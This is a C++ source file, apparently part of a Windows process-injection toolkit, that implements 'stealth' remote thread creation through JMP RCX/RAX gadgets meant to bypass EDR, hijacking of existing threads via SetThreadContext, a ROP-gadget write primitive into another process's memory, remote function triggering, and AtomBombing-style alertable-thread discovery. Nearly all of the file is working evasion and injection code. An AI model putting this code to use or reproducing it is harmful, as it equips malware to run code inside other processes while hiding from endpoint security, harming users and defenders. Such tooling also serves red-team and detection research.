#include "MagicThread.h"


/**
* Create a  thread in stealthy way
* Cannot pass parameter as its used for stezlth
*/
HANDLE MagicThread::CreateStealthThread(
	LPSECURITY_ATTRIBUTES   lpThreadAttributes,
	SIZE_T                  dwStackSize,
	LPTHREAD_START_ROUTINE  lpStartAddress,
	LPVOID                  lpParameter,
	DWORD                   dwCreationFlags,
	LPDWORD                 lpThreadId
)
{
	return MagicThread::CreateStealthRemoteThread(GetCurrentProcess(), lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
}


/**
 * Create a remote thread in stealthy way
 * Limitation: Cannot pass parameter 
 * https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread
 */
HANDLE MagicThread::CreateStealthRemoteThread(
	HANDLE                 hProcess,
	LPSECURITY_ATTRIBUTES  lpThreadAttributes,
	SIZE_T                 dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress,
	DWORD                  dwCreationFlags,
	LPDWORD                lpThreadId
)
{

	VOID * threadParameter = NULL;
	HANDLE thread;
	CONTEXT threadContext;

	/*
	Look for Gadget to bypass protections and EDR
	Here the goal is to have the thread entry point from a usual code memory space (MEM_COMMIT, MEM_IMAGE, PAGE_EXECUTE_READ)
	Then from there we jump to the malicious entrypoint using JMP RCX
	*/

	MEMORY_BASIC_INFORMATION memRestriction = { 0 };
	memRestriction.State = MEM_COMMIT;
	memRestriction.Type = MEM_IMAGE;
	memRestriction.Protect = PAGE_EXECUTE_READ;

	log_info("   [-] Looking for protection bypass gadget....\n");
	VOID * gadgetAddr = MagicMemory::SearchProcessMemory(GetProcessId(hProcess), JMP_RCX_OPCODE, memRestriction);
	if (gadgetAddr != NULL)
	{
		threadParameter = lpStartAddress;
		lpStartAddress = (LPTHREAD_START_ROUTINE)gadgetAddr;
	}

	/* Call the distant routine in a remote targetThread	*/
	log_info("   [-] Execute remote thread via CreateRemoteThread\n");
	thread = CreateRemoteThreadEx(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, threadParameter, CREATE_SUSPENDED,NULL, lpThreadId);
	if (thread != NULL)
	{
		log_info("   [-] Remote thread id: %d (0x%x)\n", GetThreadId(thread), GetThreadId(thread));
		log_info("   [-] Remote routine: 0x%p\n", lpStartAddress);
		if (threadParameter != NULL)
		{
			log_info("   [-] Real remote routine: 0x%p\n", threadParameter);
		}

		// The gadget method is not robust due to veritication in ntdll RtlUserThreadStart (RTLBaseInitThunk)
		log_info(" [+] Bypass verification done in RtlUserThreadStart...\n");
		threadContext.ContextFlags = CONTEXT_FULL;
		GetThreadContext(thread, &threadContext);
#ifdef _WIN64
		log_info("   [-] Remote thread RIP: 0x%p\n", threadContext.Rip);
		log_info("   [-] Remote thread RCX: 0x%p\n", threadContext.Rcx);
		threadContext.Rcx = (ULONG_PTR)threadParameter;
		threadContext.Rip = (ULONG_PTR)lpStartAddress;
		log_info("   [-] Remote thread new RIP: 0x%p\n", threadContext.Rip);
		log_info("   [-] Remote thread new RCX: 0x%p\n", threadContext.Rcx);
#endif
		SetThreadContext(thread, &threadContext);

		// Resume if needed
		if((dwCreationFlags & CREATE_SUSPENDED)==0)
			ResumeThread(thread);
		else
			log_info("   [!] Remote thread is in suspended state.\n");
	}
	return thread;


}


/**
 * Create a remote thread in stealthy way
 * Limitation: Cannot pass parameter
 * https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread
 */
HANDLE MagicThread::CreateStealthRemoteThread(
	HANDLE                 hProcess,
	LPSECURITY_ATTRIBUTES  lpThreadAttributes,
	SIZE_T                 dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID                 lpParameter,
	DWORD                  dwCreationFlags,
	LPDWORD                lpThreadId
)
{

	HANDLE thread;
	CONTEXT threadContext;

	/*
	Look for Gadget to bypass protections and EDR
	Here the goal is to have the thread entry point from a usual code memory space (MEM_COMMIT, MEM_IMAGE, PAGE_EXECUTE_READ)
	Then from there we jump to the malicious entrypoint using JMP RCX
	*/

	MEMORY_BASIC_INFORMATION memRestriction = { 0 };
	memRestriction.State = MEM_COMMIT;
	memRestriction.Type = MEM_IMAGE;
	memRestriction.Protect = PAGE_EXECUTE_READ;

	log_info("   [-] Looking for protection bypass gadget....\n");
#ifdef _WIN64
	VOID* gadgetAddr = MagicMemory::SearchProcessMemory(GetProcessId(hProcess), JMP_RAX_OPCODE, memRestriction);
#else
	VOID* gadgetAddr = MagicMemory::SearchProcessMemory(GetProcessId(hProcess), JMP_EAX_OPCODE, memRestriction);
#endif
	if (gadgetAddr == NULL)
	{
		log_info("   [!] Failure, could no found necessary gadget!\n");
		return NULL;
	}
	else

	/* Call the distant routine in a remote targetThread	*/
	log_info("   [-] Execute remote thread via CreateRemoteThread in suspended state\n");
	thread = CreateRemoteThreadEx(hProcess, lpThreadAttributes, dwStackSize, (LPTHREAD_START_ROUTINE)gadgetAddr, lpParameter, CREATE_SUSPENDED, NULL, lpThreadId);
	if (thread != NULL)
	{
		log_debug("     -> Remote thread id: %d (0x%x)\n", GetThreadId(thread), GetThreadId(thread));
		log_debug("     -> Remote routine: 0x%p\n", gadgetAddr);
		log_debug("     -> Real remote routine: 0x%p\n", lpStartAddress);

		// The gadget method is not robust due to veritication in ntdll RtlUserThreadStart (RTLBaseInitThunk)
		log_info("   [-] Modify target thread registries ...\n");
		threadContext.ContextFlags = CONTEXT_FULL;
		GetThreadContext(thread, &threadContext);
#ifdef _WIN64
		log_trace("     -> Remote thread RIP: 0x%p\n", threadContext.Rip);
		log_trace("     -> Remote thread RAX: 0x%p\n", threadContext.Rax);
		log_trace("     -> Remote thread RCX: 0x%p\n", threadContext.Rcx);
		threadContext.Rcx = (ULONG_PTR)lpParameter;
		threadContext.Rax = (ULONG_PTR)lpStartAddress;
		threadContext.Rip = (ULONG_PTR)gadgetAddr;
		log_trace("     -> Remote thread new RIP: 0x%p\n", threadContext.Rip);
		log_trace("     -> Remote thread new RAX: 0x%p\n", threadContext.Rax);
		log_trace("     -> Remote thread new RCX: 0x%p\n", threadContext.Rcx);
#else
		log_trace("     -> Remote thread EIP: 0x%p\n", threadContext.Eip);
		log_trace("     -> Remote thread EAX: 0x%p\n", threadContext.Eax);
		threadContext.Eax = (ULONG_PTR)lpStartAddress;
		threadContext.Eip = (ULONG_PTR)gadgetAddr;
		log_trace("     -> Remote thread new EIP: 0x%p\n", threadContext.Eip);
		log_trace("     -> Remote thread new EAX: 0x%p\n", threadContext.Eax);
#endif
		SetThreadContext(thread, &threadContext);

		// Resume if needed
		if ((dwCreationFlags & CREATE_SUSPENDED) == 0)
		{
			log_info("   [-] Resume target thread ...\n");
			ResumeThread(thread);
		}
		else
			log_info("   [!] Remote thread is in suspended state.\n");
	}
	return thread;


}


/*
From https://github.com/odzhan/injection/blob/master/apc/apc.c
// Try to find thread in alertable state for opened process.
// This is based on code used in AtomBombing technique.
//
// https://github.com/BreakingMalwareResearch/atom-bombing
//
*/
HANDLE MagicThread::FindAlertableThread(HANDLE hProcess) 
{
	DWORD         i, cnt = 0;
	HANDLE         ss, ht, hThreadResult = NULL,
		hThreadList[MAXIMUM_WAIT_OBJECTS],
		sh[MAXIMUM_WAIT_OBJECTS],
		th[MAXIMUM_WAIT_OBJECTS];
	THREADENTRY32 te;
	HMODULE       m;
	LPVOID        f;
	DWORD pid = GetProcessId(hProcess);

	// 1. Enumerate threads in target process
	ss = CreateToolhelp32Snapshot(
		TH32CS_SNAPTHREAD, 0);

	if (ss == INVALID_HANDLE_VALUE) return NULL;

	te.dwSize = sizeof(THREADENTRY32);

	if (Thread32First(ss, &te)) {
		do {
			// if not our target process, skip it
			if (te.th32OwnerProcessID != pid) continue;
			// if we can't open thread, skip it
			ht = OpenThread(
				THREAD_ALL_ACCESS,
				FALSE,
				te.th32ThreadID);

			if (ht == NULL) continue;
			// otherwise, add to list
			hThreadList[cnt++] = ht;
			// if we've reached MAXIMUM_WAIT_OBJECTS. break
			if (cnt == MAXIMUM_WAIT_OBJECTS) break;
		} while (Thread32Next(ss, &te));
	}

	// Resolve address of SetEvent
	m = GetModuleHandle(TEXT("kernel32.dll"));
	f = GetProcAddress(m, "SetEvent");

	for (i = 0; i < cnt; i++) {
		// 2. create event and duplicate in target process
		sh[i] = CreateEvent(NULL, FALSE, FALSE, NULL);

		DuplicateHandle(
			GetCurrentProcess(),  // source process
			sh[i],                // source handle to duplicate
			hProcess,                   // target process
			&th[i],               // target handle
			0,
			FALSE,
			DUPLICATE_SAME_ACCESS);

		// 3. Queue APC for thread passing target event handle
		QueueUserAPC((PAPCFUNC)f, hThreadList[i], (ULONG_PTR)th[i]);
	}

	// 4. Wait for event to become signalled
	i = WaitForMultipleObjects(cnt, sh, FALSE, 1000);
	if (i != WAIT_TIMEOUT) {
		// 5. save thread handle
		hThreadResult = hThreadList[i];
	}

	log_debug("     -> Found alertable thread (%p)\n", GetThreadId(hThreadResult));

	// 6. Close source + target handles
	for (i = 0; i < cnt; i++) {
		CloseHandle(sh[i]);
		CloseHandle(th[i]);
		if ((hThreadList[i] != hThreadResult) &&(hThreadList[i]!=NULL))CloseHandle(hThreadList[i]);
	}
	CloseHandle(ss);
	return hThreadResult;
}



/*
Initialization fonction required before calling WriteToRemoteThread and CallRemoteProc
If createNewThread is true, this will call createRemoteThread in suspended state to generate the thread we use to manipulate context
return TRUE if function succeeds
*/
BOOL MagicThread::InitThreadContextManipulation(HANDLE hProcess, PREMOTE_THREAD_CONTEXT_MANIPULATION rtManipulation, BOOL createNewThread)
{
	MEMORY_BASIC_INFORMATION memRestriction = { 0 };
	memRestriction.State = MEM_COMMIT;
	memRestriction.Type = MEM_IMAGE;
	memRestriction.Protect = PAGE_EXECUTE_READ;
	

	log_debug(" [+] Prepare for context manipulation in %d ...\n", GetProcessId(hProcess));
	my_memset(rtManipulation, 0, sizeof(REMOTE_THREAD_CONTEXT_MANIPULATION));
	rtManipulation->isThreadSuspended = FALSE;
	rtManipulation->hProcess = hProcess;

	log_debug("   [-] Looking for JMP 0 \n");
	rtManipulation->jmp0GadgetAddr = (ADDRESS_VALUE) MagicMemory::SearchProcessMemory(rtManipulation->hProcess, JMP_0_OPCODE, memRestriction);
	log_debug("   [-] Looking for Write gadget \n");
	/*
	python ROPgadget.py --binary C:\Windows\System32\ntdll.dll
	0x000000018005de0a : mov qword ptr [rdx], rax ; ret
	-> 00007FFC209DDE0A  48 89 02 C3 B8 0D 00 00 C0 C3 CC CC CC CC CC CC  H..Ã¸...ÀÃÌÌÌÌÌÌ
	*/
	rtManipulation->writeGadgetAddr = (ADDRESS_VALUE) MagicMemory::SearchProcessMemory(rtManipulation->hProcess, MOV_PTRRDX_RAX_RET, memRestriction);
	if (!rtManipulation->jmp0GadgetAddr || !rtManipulation->writeGadgetAddr)
	{
		log_info("   [!] Failure, could not found necessary gadget!\n");
		return FALSE;
	}
		
	if (createNewThread)
	{
		rtManipulation->createNewThread = TRUE;
		log_debug("   [-] Execute remote thread via CreateRemoteThread in suspended state\n");
		rtManipulation->hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rtManipulation->jmp0GadgetAddr, NULL, CREATE_SUSPENDED, NULL);
		rtManipulation->isThreadSuspended = TRUE;
		log_debug("   [-] Save thread context \n");
		rtManipulation->savedThreadContext.ContextFlags = CONTEXT_FULL;
		GetThreadContext(rtManipulation->hThread, &(rtManipulation->savedThreadContext));
	}
	else
	{
		
		rtManipulation->createNewThread = FALSE;

		HWND mainWindow = MagicWindow::FindMainWindow(GetProcessId(hProcess));
		DWORD remoteThreadId = GetWindowThreadProcessId(mainWindow, NULL);
		//DWORD remoteThreadId = MagicThread::GetThreadIdFromProcess(GetProcessId(hProcess));
		log_debug("   [-] Hijacking existing thread (%d, 0x%p)\n", remoteThreadId, remoteThreadId);
		rtManipulation->hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, remoteThreadId); //THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT
		log_debug("   [-] Suspend thread\n");
		SuspendThread(rtManipulation->hThread);
		rtManipulation->isThreadSuspended = TRUE;
		log_debug("   [-] Save thread context \n");
		rtManipulation->savedThreadContext.ContextFlags = CONTEXT_FULL;
		GetThreadContext(rtManipulation->hThread, &(rtManipulation->savedThreadContext));
		log_debug("   [-] Modify context to point to JMP 0\n");
		PostMessage(mainWindow, WM_USER, 0, 0);
		PostMessage(mainWindow, WM_USER, 0, 0);
		PostMessage(mainWindow, WM_USER, 0, 0);
		CONTEXT threadContext;
		threadContext.ContextFlags = CONTEXT_FULL;
		GetThreadContext(rtManipulation->hThread, &threadContext);
		threadContext.Rip = (ULONG_PTR)rtManipulation->jmp0GadgetAddr; 
		SetThreadContext(rtManipulation->hThread, &threadContext);
		do
		{
			ResumeThread(rtManipulation->hThread);
			Sleep(50);
			SuspendThread(rtManipulation->hThread);
			GetThreadContext(rtManipulation->hThread, &threadContext);
		} while (threadContext.Rip != rtManipulation->jmp0GadgetAddr);
	}

	if (rtManipulation->hThread != NULL)
	{
		rtManipulation->jmp0StackAddr = rtManipulation->savedThreadContext.Rsp-0x8000; // leave some space for thread stack
		log_debug("   [-] Put JMP_0 gadget addr on thread stack \n");
		MagicThread::WriteToRemoteThread(rtManipulation, rtManipulation->jmp0StackAddr, (ADDRESS_VALUE)rtManipulation->jmp0GadgetAddr);

	}
	else
	{
		log_error("   [!] Failure, could not create/access remote thread\n");
		return FALSE;
	}
	return TRUE;
}


/*
Will clean when you are finished with context manipulation
Will terminate created thead or restore hijacked thread
return TRUE if function succeeds
*/
BOOL MagicThread::EndThreadContextManipulation(PREMOTE_THREAD_CONTEXT_MANIPULATION rtManipulation)
{
	log_debug(" [+] Clean after context manipulation...\n");
	if (!rtManipulation->isThreadSuspended)
		SuspendThread(rtManipulation->hThread);

	if (rtManipulation->createNewThread)
	{
		log_debug("   [-] Terminate thread %d\n", GetThreadId(rtManipulation->hThread));
		TerminateThread(rtManipulation->hThread, 0);
	}
	else
	{
		log_debug("   [-] Restore hijacked thread %d\n", GetThreadId(rtManipulation->hThread));
		SetThreadContext(rtManipulation->hThread, &(rtManipulation->savedThreadContext));
		ResumeThread(rtManipulation->hThread);
		ResumeThread(rtManipulation->hThread);
		rtManipulation->isThreadSuspended = FALSE;
	}
	CloseHandle(rtManipulation->hThread);
	my_memset(rtManipulation, 0, sizeof(REMOTE_THREAD_CONTEXT_MANIPULATION));
	return TRUE;
}

/*
Use context manipulation to write valueToWrite at addressToWrite in another process
rtManipulation must have been previously initialized by a call to MagicThread::InitThreadContextManipulation
*/
VOID MagicThread::WriteToRemoteThread(PREMOTE_THREAD_CONTEXT_MANIPULATION rtManipulation, ULONG_PTR addressToWrite, ADDRESS_VALUE valueToWrite)
{
	if (!rtManipulation->isThreadSuspended)
		SuspendThread(rtManipulation->hThread);

	//log_info("   [-] addressToWrite:0x%p\n",addressToWrite);
	//log_info("   [-] valueToWrite:0x%p\n", valueToWrite);
	//MessageBoxA(NULL, "Tddd", "PaRAMsite", MB_OK);
	
	CONTEXT threadContext;
	threadContext.ContextFlags = CONTEXT_FULL;
	GetThreadContext(rtManipulation->hThread, &threadContext);

	threadContext.Rax = (ULONG_PTR)valueToWrite;
	threadContext.Rdx = (ULONG_PTR)addressToWrite;
	threadContext.Rip = (ULONG_PTR)rtManipulation->writeGadgetAddr; // Gadget is: MOV [RDX], RAX; RET
	threadContext.Rsp = (ULONG_PTR)rtManipulation->jmp0StackAddr; // So RET will return to JMP 0 infinit loop

	SetThreadContext(rtManipulation->hThread, &threadContext);

	ResumeThread(rtManipulation->hThread);
	Sleep(2);
	SuspendThread(rtManipulation->hThread);
	rtManipulation->isThreadSuspended = TRUE;
}


/*
Trigger a function is another process, 4 parameters can be passed
rtManipulation must have been previously initialized by a call to MagicThread::InitThreadContextManipulation
*/
ADDRESS_VALUE  MagicThread::TriggerFunctionInRemoteProcess(
	PREMOTE_THREAD_CONTEXT_MANIPULATION rtManipulation,
	CONST TCHAR* moduleName,
	CONST TCHAR* functionName,
	ADDRESS_VALUE          param1,
	ADDRESS_VALUE          param2,
	ADDRESS_VALUE          param3,
	ADDRESS_VALUE          param4
)
{
	ADDRESS_VALUE result=-1;
	FARPROC remoteProc = NULL;
	HMODULE remoteModule = NULL;


	log_info("   [-] Trigger %s in %d... \n",functionName, GetProcessId(rtManipulation->hProcess));

	log_debug("   [-] Looking for  %s->%s.\n", moduleName, functionName);
	//if (rtManipulation->hProcess)
	//{
	//	remoteModule = MagicModule::GetRemoteModuleHandle(rtManipulation->hProcess, moduleName);
	//	log_debug("     -> Remote module is at %p.\n", remoteModule);
	//	remoteProc = MagicModule::GetRemoteProcAddress(rtManipulation->hProcess, remoteModule, functionName, 0, FALSE);
	//	log_debug("     -> Remote proc is at %p.\n", remoteProc);
	//}
	//else
	//{
		log_debug("   [!] No readable process handle. Guessing addr from local process.\n");
		remoteModule = GetModuleHandle(moduleName);
		log_debug("     -> Remote module should be at %p.\n", remoteModule);
		remoteProc = GetProcAddress(remoteModule, functionName);
		log_debug("     -> Remote proc should be at %p.\n", remoteProc);
	//}

	if (remoteProc)
	{
		CONTEXT threadContext;
		threadContext.ContextFlags = CONTEXT_FULL;
		GetThreadContext(rtManipulation->hThread, &threadContext);

		log_debug("   [-] Set thread context to trigger remote proc\n");
		if (!rtManipulation->isThreadSuspended)
		{
			SuspendThread(rtManipulation->hThread);
			rtManipulation->isThreadSuspended = TRUE;
		}
#ifdef _WIN64

		threadContext.Rcx = (ULONG_PTR)param1;
		threadContext.Rdx = (ULONG_PTR)param2;
		threadContext.R8 = (ULONG_PTR)param3;
		threadContext.R9 = (ULONG_PTR)param4;
		threadContext.Rip = (ULONG_PTR)remoteProc;
		threadContext.Rsp = (ULONG_PTR)rtManipulation->jmp0StackAddr; // So RET will return to JMP 0 infinit loop

		log_trace("     -> Remote thread new RIP: 0x%p\n", threadContext.Rip);
		log_trace("     -> Remote thread new RCX: 0x%p\n", threadContext.Rcx);
		log_trace("     -> Remote thread new RDX: 0x%p\n", threadContext.Rdx);
		log_trace("     -> Remote thread new R8: 0x%p\n", threadContext.R8);
		log_trace("     -> Remote thread new R9: 0x%p\n", threadContext.R9);
		log_trace("     -> Remote thread new RSP: 0x%p\n", threadContext.Rsp);

		SetThreadContext(rtManipulation->hThread, &threadContext);
#endif
		log_debug("   [-] Resume target thread (remote proc should trigger!)\n");
		ResumeThread(rtManipulation->hThread);

		rtManipulation->isThreadSuspended = FALSE;
		/*do
		{
			ResumeThread(rtManipulation->hThread);
			Sleep(10);   
			SuspendThread(rtManipulation->hThread);
			GetThreadContext(rtManipulation->hThread, &threadContext);
		} while (threadContext.Rip  != rtManipulation->jmp0GadgetAddr);*/
		Sleep(1000);
		DWORD exitCode = 0;
		GetExitCodeThread(rtManipulation->hThread, &exitCode);
		if (exitCode == STILL_ACTIVE)
		{
			log_debug("   [-] Get proc result\n");
			SuspendThread(rtManipulation->hThread);
			rtManipulation->isThreadSuspended = TRUE;
			threadContext.ContextFlags = CONTEXT_FULL;
			GetThreadContext(rtManipulation->hThread, &threadContext);
#ifdef _WIN64
			log_debug("     -> Remote thread RIP: 0x%p\n", threadContext.Rip);
			log_debug("     -> Remote thread RAX: 0x%p\n", threadContext.Rax);
			result = threadContext.Rax;
			ResumeThread(rtManipulation->hThread);
			rtManipulation->isThreadSuspended = FALSE;
#endif
		}
		else
		{
			log_warn("   [!] Remote thread was killed :(\n");
		}
	}
	else
	{
		log_error("   [!] Could not find remote proc\n");
	}
	return result;
}







#pragma pack(push,8)


// http://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/thread.htm
// Size = 0x40 for Win32
// Size = 0x50 for Win64
struct SYSTEM_THREAD
{
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER CreateTime;
	ULONG         WaitTime;
	PVOID         StartAddress;
	CLIENT_ID     ClientID;           // process/thread ids
	LONG          Priority;
	LONG          BasePriority;
	ULONG         ContextSwitches;
	THREAD_STATE  ThreadState;
	KWAIT_REASON  WaitReason;
};

struct VM_COUNTERS // virtual memory of process
{
	ULONG_PTR PeakVirtualSize;
	ULONG_PTR VirtualSize;
	ULONG     PageFaultCount;
	ULONG_PTR PeakWorkingSetSize;
	ULONG_PTR WorkingSetSize;
	ULONG_PTR QuotaPeakPagedPoolUsage;
	ULONG_PTR QuotaPagedPoolUsage;
	ULONG_PTR QuotaPeakNonPagedPoolUsage;
	ULONG_PTR QuotaNonPagedPoolUsage;
	ULONG_PTR PagefileUsage;
	ULONG_PTR PeakPagefileUsage;
};



// http://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/process.htm
// See also SYSTEM_PROCESS_INROMATION in Winternl.h
// Size = 0x00B8 for Win32
// Size = 0x0100 for Win64
struct SYSTEM_PROCESS
{
	ULONG          NextEntryOffset; // relative offset
	ULONG          ThreadCount;
	LARGE_INTEGER  WorkingSetPrivateSize;
	ULONG          HardFaultCount;
	ULONG          NumberOfThreadsHighWatermark;
	ULONGLONG      CycleTime;
	LARGE_INTEGER  CreateTime;
	LARGE_INTEGER  UserTime;
	LARGE_INTEGER  KernelTime;
	UNICODE_STRING ImageName;
	LONG           BasePriority;
	PVOID          UniqueProcessId;
	PVOID          InheritedFromUniqueProcessId;
	ULONG          HandleCount;
	ULONG          SessionId;
	ULONG_PTR      UniqueProcessKey;
	VM_COUNTERS    VmCounters;
	ULONG_PTR      PrivatePageCount;
	IO_COUNTERS    IoCounters;   // defined in winnt.h
};


#pragma pack(pop)

class cProcInfo // From https://codeday.me/en/qa/20190306/5111.html
{
public:
	cProcInfo()
	{
#ifdef WIN64
		//assert(sizeof(SYSTEM_THREAD) == 0x50 && sizeof(SYSTEM_PROCESS) == 0x100);
#else
		//assert(sizeof(SYSTEM_THREAD) == 0x40 && sizeof(SYSTEM_PROCESS) == 0xB8);
#endif

		mu32_DataSize = 1000;
		mp_Data = NULL;
	}
	virtual ~cProcInfo()
	{
		if (mp_Data) LocalFree(mp_Data);
	}

	// Capture all running processes and all their threads.
	// returns an API or NTSTATUS Error code or zero if successfull
	DWORD Capture()
	{

		// This must run in a loop because in the mean time a new process may have started 
		// and we need more buffer than u32_Needed !!
		while (true)
		{
			if (!mp_Data)
			{
				mp_Data = (BYTE*)LocalAlloc(LMEM_FIXED, mu32_DataSize);
				if (!mp_Data)
					return GetLastError();
			}

			ULONG u32_Needed = 0;
			NTSTATUS s32_Status = NtQuerySystemInformation(SystemProcessInformation, mp_Data, mu32_DataSize, &u32_Needed);

			if (s32_Status == STATUS_INFO_LENGTH_MISMATCH) // The buffer was too small
			{
				mu32_DataSize = u32_Needed + 4000;
				LocalFree(mp_Data);
				mp_Data = NULL;
				continue;
			}
			return s32_Status;
		}
	}

	// Searches a process by a given Process Identifier
	// Capture() must have been called before!
	SYSTEM_PROCESS* FindProcessByPid(DWORD u32_PID)
	{
		if (!mp_Data)
		{
			return NULL;
		}

		SYSTEM_PROCESS* pk_Proc = (SYSTEM_PROCESS*)mp_Data;
		while (TRUE)
		{
			if ((DWORD)(DWORD_PTR)pk_Proc->UniqueProcessId == u32_PID)
				return pk_Proc;

			if (!pk_Proc->NextEntryOffset)
				return NULL;

			pk_Proc = (SYSTEM_PROCESS*)((BYTE*)pk_Proc + pk_Proc->NextEntryOffset);
		}
	}

	SYSTEM_THREAD* FindThreadByTid(SYSTEM_PROCESS* pk_Proc, DWORD u32_TID)
	{
		if (!pk_Proc)
		{
			//assert(pk_Proc);
			return NULL;
		}

		// The first SYSTEM_THREAD structure comes immediately after the SYSTEM_PROCESS structure
		SYSTEM_THREAD* pk_Thread = (SYSTEM_THREAD*)((BYTE*)pk_Proc + sizeof(SYSTEM_PROCESS));

		for (DWORD i = 0; i < pk_Proc->ThreadCount; i++)
		{
			if (pk_Thread->ClientID.UniqueThread == (HANDLE)(DWORD_PTR)u32_TID)
				return pk_Thread;

			pk_Thread++;
		}
		return NULL;
	}

	DWORD IsThreadSuspended(SYSTEM_THREAD* pk_Thread, BOOL* pb_Suspended)
	{
		if (!pk_Thread)
			return ERROR_INVALID_PARAMETER;

		*pb_Suspended = (pk_Thread->ThreadState == Waiting &&
			pk_Thread->WaitReason == Suspended);
		return 0;
	}

private:
	BYTE* mp_Data;
	DWORD       mu32_DataSize;
};




/*
	Find  a suspended thread in a given process.
	Return a TID of suspended thread if found. Return 0 if not.
*/
DWORD MagicThread::FindSuspendedThread(DWORD pid)
{
	DWORD result = 0;
	cProcInfo i_Proc;
	BOOL b_Suspend;
	DWORD u32_Error = i_Proc.Capture();
	if (u32_Error)
	{
		log_error("   [!] Error 0x%X capturing processes.\n", u32_Error);
		return 0;
	}

	SYSTEM_PROCESS* pk_Proc = i_Proc.FindProcessByPid(pid);
	if (!pk_Proc)
	{
		log_error("   [!] The process does not exist.\n");
		return 0;
	}

	// The first SYSTEM_THREAD structure comes immediately after the SYSTEM_PROCESS structure
	SYSTEM_THREAD* pk_Thread = (SYSTEM_THREAD*)((BYTE*)pk_Proc + sizeof(SYSTEM_PROCESS));

	for (DWORD i = 0; i < pk_Proc->ThreadCount; i++)
	{
		i_Proc.IsThreadSuspended(pk_Thread, &b_Suspend);
		if (b_Suspend)
		{
			result = (DWORD) pk_Thread->ClientID.UniqueThread;
			log_debug("   [-] Found suspended thread: %d \n", result);
			break;
		}

		pk_Thread++;
	}

	return result;
}



/*
Attempt to get a handle from the first thread which allows it for the dwDesiredAccess flags
It is poaaible to to run additional check by passing a callback. Set to NULL if you do not use.
*/
HANDLE MagicThread::GetAnyValidThreadHandle(DWORD dwDesiredAccess, BOOL(*ConditionCheckCallback)(HANDLE hThread))
{
	HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
	THREADENTRY32 te32;
	HANDLE hThread = NULL;

	log_info(TEXT("   [-] Looking for thread handle \n"));

	// Take a snapshot of all running threads  
	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap == INVALID_HANDLE_VALUE)
		return(FALSE);

	// Fill in the size of the structure before using it. 
	te32.dwSize = sizeof(THREADENTRY32);

	// Retrieve information about the first thread,
	// and exit if unsuccessful
	if (!Thread32First(hThreadSnap, &te32))
	{
		MagicUtils::PrintError(TEXT("Thread32First"));  // Show cause of failure
		CloseHandle(hThreadSnap);     // Must clean up the snapshot object!
		return(FALSE);
	}
	do
	{
		if (te32.th32OwnerProcessID != GetCurrentProcessId()) // We skip threads from the current process
		{
			hThread = OpenThread(dwDesiredAccess, FALSE, te32.th32ThreadID);
			if (hThread)
			{
				if (ConditionCheckCallback)
				{
					if (!ConditionCheckCallback(hThread))
					{
						CloseHandle(hThread);
						continue;
					}
				}
				log_info(TEXT("     -> Found thread ID %d, process %d \n"), te32.th32ThreadID, te32.th32OwnerProcessID);
				log_info(TEXT("     -> current process %d \n"),  GetCurrentProcessId());
				break;
			}
			CloseHandle(hThread);

		}
	} while (Thread32Next(hThreadSnap, &te32));

	//  Clean up the snapshot object.
	CloseHandle(hThreadSnap);
	return hThread;
}



BOOL ListProcessThreads(DWORD dwOwnerPID)
{
	HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
	THREADENTRY32 te32;

	// Take a snapshot of all running threads  
	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap == INVALID_HANDLE_VALUE)
		return(FALSE);

	// Fill in the size of the structure before using it. 
	te32.dwSize = sizeof(THREADENTRY32);

	// Retrieve information about the first thread,
	// and exit if unsuccessful
	if (!Thread32First(hThreadSnap, &te32))
	{
		MagicUtils::PrintError(TEXT("Thread32First"));  // Show cause of failure
		CloseHandle(hThreadSnap);     // Must clean up the snapshot object!
		return(FALSE);
	}

	// Now walk the thread list of the system,
	// and display information about each thread
	// associated with the specified process
	do
	{
		if (te32.th32OwnerProcessID == dwOwnerPID)
		{
			_tprintf(TEXT("\n     THREAD ID      = 0x%08X"), te32.th32ThreadID);
			_tprintf(TEXT("\n     base priority  = %d"), te32.tpBasePri);
			_tprintf(TEXT("\n     delta priority = %d"), te32.tpDeltaPri);
		}
	} while (Thread32Next(hThreadSnap, &te32));

	_tprintf(TEXT("\n"));

	//  Don't forget to clean up the snapshot object.
	CloseHandle(hThreadSnap);
	return(TRUE);
}



/*
Get a thread ID for a given process. Probably the main thread but no guarantee.
*/
DWORD MagicThread::GetThreadIdFromProcess(DWORD pid)
{
	HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
	THREADENTRY32 te32;
	DWORD result;

	// Take a snapshot of all running threads  
	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap == INVALID_HANDLE_VALUE)
		return(FALSE);

	// Fill in the size of the structure before using it. 
	te32.dwSize = sizeof(THREADENTRY32);

	// Retrieve information about the first thread,
	// and exit if unsuccessful
	if (!Thread32First(hThreadSnap, &te32))
	{
		MagicUtils::PrintError(TEXT("Thread32First"));  // Show cause of failure
		CloseHandle(hThreadSnap);     // Must clean up the snapshot object!
		return(FALSE);
	}
	do
	{
		if (te32.th32OwnerProcessID == pid)
		{
			result = te32.th32ThreadID;
		} 
	} while (Thread32Next(hThreadSnap, &te32));
	return result;
}

